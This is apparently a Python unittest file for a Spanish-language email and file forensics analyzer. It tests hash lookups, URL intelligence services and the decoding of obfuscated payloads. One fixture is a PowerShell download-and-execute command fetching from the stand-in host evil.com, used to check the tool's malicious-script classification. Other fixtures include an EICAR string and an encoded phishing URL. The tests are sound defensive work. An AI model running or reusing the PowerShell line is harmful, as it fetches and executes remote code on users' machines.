import json
import os
import io
import tempfile
import hashlib
import unittest
import urllib.parse
from unittest.mock import Mock, patch

import analizador


class FakeResponse:
    def __init__(self, payload):
        self.payload = json.dumps(payload).encode()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return False

    def read(self):
        return self.payload


class UrlIntelTests(unittest.TestCase):
    def test_extracts_api_error_title_from_json_body(self):
        error = analizador.urllib.error.HTTPError(
            "https://urlscan.io/api/v1/scan/",
            400,
            "Bad Request",
            {},
            io.BytesIO(b'{"error": "DNS Error", "message": "The hostname could not be resolved"}'),
        )

        try:
            self.assertEqual(
                analizador.get_http_error_title(error, "Error HTTP 400"),
                "DNS Error",
            )
        finally:
            error.close()

    def test_http_error_detail_keeps_status_and_api_reason(self):
        error = analizador.urllib.error.HTTPError(
            "https://example.test/",
            400,
            "Bad Request",
            {},
            io.BytesIO(b'{"error": "DNS Error", "message": "The hostname could not be resolved"}'),
        )

        try:
            detail = analizador.get_http_error_detail(error, "Consulta fallida")
        finally:
            error.close()

        self.assertEqual(detail, "HTTP 400: DNS Error — The hostname could not be resolved")

    def test_analyzes_file_without_executing_it(self):
        with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as file_handle:
            file_handle.write(b"contenido de prueba")
            filepath = file_handle.name
        try:
            data = analizador.analyze_file_locally(filepath)
        finally:
            os.unlink(filepath)

        self.assertEqual(data["size"], len(b"contenido de prueba"))
        self.assertEqual(data["hashes"]["SHA-256"], hashlib.sha256(b"contenido de prueba").hexdigest())

    def test_uses_oldest_received_header_for_source_ip(self):
        message = (
            b"From: sender@example.com\n"
            b"To: user@example.net\n"
            b"Received: from relay.example ([198.51.100.10])\n"
            b"Received: from origin.example ([203.0.113.25])\n"
            b"Content-Type: text/plain; charset=utf-8\n\nHola"
        )
        with tempfile.NamedTemporaryFile(delete=False, suffix=".eml") as file_handle:
            file_handle.write(message)
            filepath = file_handle.name
        try:
            data = analizador.parse_eml_file(filepath)
        finally:
            os.unlink(filepath)

        self.assertEqual(data["source_ip"], "203.0.113.25")

    def test_detects_eicar_without_executing_it(self):
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        self.assertTrue(analizador.is_eicar_test_file(eicar))

    def test_looks_up_file_hash_without_uploading_file(self):
        response = {"data": {"attributes": {"last_analysis_stats": {"malicious": 2, "suspicious": 1}}}}
        with patch.object(analizador.urllib.request, "urlopen", return_value=FakeResponse(response)) as mocked_urlopen:
            result = analizador.vt_lookup_file_hash("a" * 64, "test-key")

        self.assertEqual(result["status"], "success")
        self.assertEqual(result["malicious"], 2)
        self.assertIn("/files/" + "a" * 64, mocked_urlopen.call_args.args[0].full_url)

    def test_reads_existing_sandbox_behavior_by_hash(self):
        response = {"data": [{"attributes": {"sandbox_name": "Sandbox", "verdict": "malicious", "processes": [{}], "network_connections": [{}, {}]}}]}
        with patch.object(analizador.urllib.request, "urlopen", return_value=FakeResponse(response)):
            result = analizador.vt_lookup_file_behavior("b" * 64, "test-key")

        self.assertEqual(result["status"], "success")
        self.assertEqual(result["processes"], 1)
        self.assertEqual(result["network"], 2)
    def test_extracts_common_obfuscation_candidates(self):
        text = "Texto U29tZSBtYWxpY2lvdXMgcGF5bG9hZA== %68%6f%6c%61 48 65 6c 6c 6f 20 77 6f 72 6c 64"
        candidates = analizador.extract_obfuscated_candidates(text)

        self.assertIn("U29tZSBtYWxpY2lvdXMgcGF5bG9hZA==", candidates)
        self.assertIn("%68%6f%6c%61", candidates)
        self.assertIn("48 65 6c 6c 6f 20 77 6f 72 6c 64", candidates)

    def test_deobfuscates_base64_native_fallback(self):
        # Base64 válido de "Hola Mundo!"
        raw_b64 = "SG9sYSBNdW5kbyE="
        # Con padding forzado para cumplir candidato >= 16 chars: "SG9sYSBNdW5kbyEgdGVzdA==" ("Hola Mundo! test")
        candidate = "SG9sYSBNdW5kbyEgdGVzdA=="
        results = analizador.analyze_obfuscation(candidate)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["status"], "success")
        self.assertEqual(results[0]["output"], "Hola Mundo! test")

    def test_deobfuscates_url_and_hex_native_fallback(self):
        url_encoded = "%68%6f%6c%61%20%6d%75%6e%64%6f"
        results_url = analizador.analyze_obfuscation(url_encoded)
        self.assertEqual(results_url[0]["status"], "success")
        self.assertEqual(results_url[0]["output"], "hola mundo")

        hex_data = "48656c6c6f20576f726c6421"  # "Hello World!"
        results_hex = analizador.analyze_obfuscation(hex_data)
        self.assertEqual(results_hex[0]["status"], "success")
        self.assertEqual(results_hex[0]["output"], "Hello World!")

    @patch("analizador._decode_candidate_raw")
    def test_prefers_chepy_when_available(self, mock_decode):
        mock_decode.return_value = (b"payload decodificado por chepy", "payload decodificado por chepy", "Chepy (Base64)")
        candidate = "U29tZSBtYWxpY2lvdXMgcGF5bG9hZA=="
        results = analizador.analyze_obfuscation(candidate)
        self.assertEqual(results[0]["status"], "success")
        self.assertEqual(results[0]["output"], "payload decodificado por chepy")
        self.assertEqual(results[0]["engine"], "Chepy (Base64)")

    def test_backward_compatibility_alias(self):
        candidate = "SG9sYSBNdW5kbyEgdGVzdA=="
        results = analizador.analyze_obfuscation_with_cyberchef(candidate)
        self.assertEqual(results[0]["status"], "success")
        self.assertEqual(results[0]["output"], "Hola Mundo! test")

    def test_classifies_hidden_url_as_malicious(self):
        raw_bytes = b"https://evil-phishing.test/login"
        decoded = "https://evil-phishing.test/login"
        finding = analizador.classify_and_verify_payload(raw_bytes, decoded, "aHR0cHM6Ly9ldmlsLXBoaXNoaW5nLnRlc3QvbG9naW4=", "Chepy (Base64)")
        self.assertEqual(finding["category"], "HIDDEN_URL")
        self.assertEqual(finding["verdict"], "MALICIOSO")
        self.assertFalse(finding["is_noise"])
        self.assertIn("evil-phishing.test", finding["extracted_content"])
        self.assertIn("MITRE T1027", finding["threat_type"])

    def test_classifies_script_command_as_malicious(self):
        raw_bytes = b"powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
        decoded = raw_bytes.decode()
        finding = analizador.classify_and_verify_payload(raw_bytes, decoded, "cG93ZXJzaGVsbC5leGU...", "Python nativo (Base64)")
        self.assertEqual(finding["category"], "MALICIOUS_SCRIPT")
        self.assertEqual(finding["verdict"], "MALICIOSO")
        self.assertIn("T1059", finding["threat_type"])

    def test_classifies_executable_binary_as_malicious(self):
        raw_bytes = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        finding = analizador.classify_and_verify_payload(raw_bytes, raw_bytes.decode("utf-8", errors="replace"), "TVqQAAMAAAAEAAAA//8A", "Chepy (Base64)")
        self.assertEqual(finding["category"], "BINARY_PAYLOAD")
        self.assertEqual(finding["verdict"], "MALICIOSO")
        self.assertIn("Ejecutable", finding["label"])

    def test_classifies_tracking_token_as_innocuous_noise(self):
        # bu4677hunB... token de telemetría de sample-10000.eml
        token = "bu4677hunB4wXUcEimxr31tw65rV9tqt"
        results = analizador.analyze_obfuscation(token)
        self.assertTrue(len(results) >= 1)
        self.assertEqual(results[0]["category"], "TRACKING_TOKEN")
        self.assertEqual(results[0]["verdict"], "INOCUO")
        self.assertTrue(results[0]["is_noise"])

    def test_security_evaluation_incorporates_deobfuscation_threats(self):
        mock_data = {
            "from_domain": "legit.com",
            "from_name": "Admin",
            "spf_result": "pass",
            "spf_domain": "legit.com",
            "dkim_result": "pass",
            "dkim_domain": "legit.com",
            "dmarc_result": "pass",
            "dmarc_domain": "legit.com",
            "reply_to_domain": "legit.com",
            "links": [],
            "subject": "Hola",
            "body": "Cuerpo limpio",
        }
        deobf_malicious = [{
            "category": "HIDDEN_URL",
            "label": "Enlace Oculto (URL Phishing)",
            "verdict": "MALICIOSO",
            "threat_type": "Evasión de Filtro Antispam / Phishing Encubierto (MITRE T1027)",
            "forensic_interpretation": "El correo ocultó una URL en Base64.",
        }]
        eval_result = analizador.evaluate_email_security(mock_data, deobfuscation_results=deobf_malicious)
        self.assertIn("Evasión de Defensas / Contenido Ofuscado (MITRE T1027)", eval_result["threat_types"])
        self.assertGreaterEqual(eval_result["score"], 35)
    def test_analyzes_http_links_with_all_services(self):
        responses = [
            {"uuid": "scan-123", "result": "https://urlscan.io/result/scan-123/"},
            {
                "page": {
                    "url": "https://example.com/login",
                    "domain": "example.com",
                    "title": "Example",
                    "status": "200",
                },
                "verdicts": {
                    "overall": {
                        "malicious": False,
                        "score": -10,
                        "brands": [],
                    }
                },
            },
            [{"name_value": "example.com\nwww.example.com"}],
            {
                "registrar": "Example Registrar",
                "events": [{
                    "event_action": "expiration",
                    "event_date": "2030-01-01",
                }],
            },
        ]
        requests = []

        def fake_urlopen(request, **kwargs):
            requests.append(request)
            return FakeResponse(responses.pop(0))

        with patch.object(analizador.urllib.request, "urlopen", side_effect=fake_urlopen):
            with patch.object(analizador.time, "sleep"):
                results = analizador.analyze_links_with_intel(
                    {
                        "links": [
                            "https://example.com/login",
                            "https://example.com/login",
                            "mailto:help@example.com",
                            "javascript:alert(1)",
                        ]
                    },
                    "test-urlscan-key",
                    "test-whois-key",
                )

        self.assertEqual([result["provider"] for result in results], ["urlscan", "crt.sh", "WHOIS"])
        self.assertEqual(results[0]["status"], "success")
        self.assertEqual(results[0]["visibility"], "public")
        self.assertFalse(results[0]["malicious"])
        self.assertEqual(results[0]["score"], -10)
        self.assertEqual(results[0]["page_title"], "Example")
        self.assertEqual(results[1]["certificate_count"], 1)
        self.assertIn("www.example.com", results[1]["names"])
        self.assertEqual(results[2]["expiration"], "2030-01-01")

        self.assertEqual(requests[0].get_header("Api-key"), "test-urlscan-key")
        self.assertEqual(json.loads(requests[0].data)["visibility"], "public")
        self.assertEqual(requests[1].full_url, "https://urlscan.io/api/v1/result/scan-123/")
        self.assertEqual(requests[1].get_header("Api-key"), "test-urlscan-key")
        self.assertEqual(urllib.parse.parse_qs(urllib.parse.urlsplit(requests[2].full_url).query)["q"], ["%.example.com"])
        self.assertEqual(requests[3].full_url, "https://api.who.is/v1/whois/example.com")
        self.assertEqual(requests[3].get_header("Authorization"), "Bearer test-whois-key")

    def test_crtsh_runs_without_private_api_keys(self):
        with patch.object(
            analizador.urllib.request,
            "urlopen",
            return_value=FakeResponse([]),
        ) as mocked_urlopen:
            results = analizador.analyze_links_with_intel(
                {"links": ["https://example.com/"]},
                None,
                None,
            )

        self.assertEqual([result["status"] for result in results], ["no_key", "success", "no_key"])
        self.assertEqual(mocked_urlopen.call_count, 1)

    def test_hostname_rejects_non_http_links_and_normalizes_idn(self):
        self.assertIsNone(analizador.get_url_hostname("mailto:user@example.com"))
        self.assertEqual(
            analizador.get_url_hostname("https://BÜCHER.example/path"),
            "xn--bcher-kva.example",
        )


if __name__ == "__main__":
    unittest.main()
